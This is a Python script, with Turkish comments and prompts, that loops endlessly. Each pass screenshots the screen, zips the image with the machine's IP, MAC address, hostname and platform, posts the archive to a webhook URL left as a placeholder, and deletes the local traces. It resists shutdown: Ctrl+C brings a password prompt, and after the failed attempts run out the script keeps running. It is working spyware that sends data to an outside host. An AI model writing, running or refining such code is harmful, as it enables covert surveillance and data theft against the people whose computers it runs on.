import pyautogui
import time
import requests
import sys
import socket
import uuid
import zipfile
import os
import hashlib
import platform

webhook_url = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
interval = X  # saniye cinsinden zaman aralığı
max_attempts = X  # maksimum deneme hakkı
hashed_password = hashlib.sha256("xxxxxxxxxxxxxxxxxx".encode()).hexdigest()  # set your password

def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_address = s.getsockname()[0]
    s.close()
    return ip_address

def get_mac_address():
    mac_address = uuid.getnode()
    mac_address = ':'.join(("%012X" % mac_address)[i:i+2] for i in range(0, 12, 2))
    return mac_address

def get_computer_info():
    computer_name = platform.node()
    computer_location = platform.platform()
    return computer_name, computer_location

def create_zip(screenshot_path, zip_path):
    with zipfile.ZipFile(zip_path, 'w') as zipf:
        zipf.write(screenshot_path, os.path.basename(screenshot_path))
        # Add a text file with IP, MAC address, computer name and location
        with open('info.txt', 'w') as info_file:
            info_file.write(f"IP Address: {get_ip_address()}\n")
            info_file.write(f"MAC Address: {get_mac_address()}\n")
            computer_name, computer_location = get_computer_info()
            info_file.write(f"Computer Name: {computer_name}\n")
            info_file.write(f"Computer Location: {computer_location}\n")
        zipf.write('info.txt')

try:
    while True:
        screenshot_path = "screenshot.png"
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)

        zip_path = "data.zip"
        create_zip(screenshot_path, zip_path)

        with open(zip_path, "rb") as zip_file:
            files = {"file": zip_file}
            response = requests.post(webhook_url, files=files)

        # Clean up temporary files
        os.remove(screenshot_path)
        os.remove('info.txt')
        os.remove(zip_path)

        time.sleep(interval)

except KeyboardInterrupt:
    attempts = max_attempts
    while attempts > 0:
        try:
            password = input(f"\n(durdurma sifresi, {attempts} deneme hakkı kaldı): ")
            if hashlib.sha256(password.encode()).hexdigest() == hashed_password:
                print("durduruluyor..")
                sys.exit()  # Terminate the program
            else:
                attempts -= 1
                print("hatali parola")
        except KeyboardInterrupt:
            print("\nInput interrupted. Continuing...")
            attempts -= 1  # Decrement attempts on KeyboardInterrupt
            continue  # Continue the loop without breaking

    if attempts == 0:
        print("deneme hakkiniz kalmadi, program devam ediyor...")